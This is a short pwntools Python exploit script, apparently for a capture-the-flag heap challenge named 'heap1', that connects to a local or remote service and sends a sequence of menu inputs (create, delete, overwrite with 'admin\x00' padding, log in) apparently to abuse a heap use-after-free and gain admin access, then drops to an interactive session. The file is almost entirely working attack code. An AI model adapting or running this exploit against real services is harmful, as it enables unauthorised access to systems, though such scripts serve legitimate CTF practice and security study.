from pwn import *


exe = ELF("heap1")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe

context.log_level = 'error'

def conn():
    if args.REMOTE:
        r = remote("127.0.0.1", 7016)
        # r = remote("128.199.12.141", 7013)
    else:
        # r = exe.process()
        r = gdb.debug(exe.path)
    return r


r = conn()

r.sendline(b"1")
r.sendline(b"0")
r.sendline(b"l" * 32) #username
r.sendline(b"A" * 6)

r.sendline(b"3")
r.sendline(b"0")
# r.sendline(b"1")
# r.sendline(b"1")
# r.sendline(b"l" * 32) #username
# r.sendline(b"lmao")

# r.sendline(b"3")
# r.sendline(b"1")



r.sendline(b"4")
r.sendline(b"admin\x00".ljust(30,b'B'))

r.sendline(b"2")
r.sendline(b"0")
r.sendline(b"A" * 6)

r.interactive()




# r.sendline(b"1")
# r.sendline(b"2")
# r.sendline(b"lmao")
# r.sendline(b"lmao")

# automate inputs as necessary here

r.interactive()
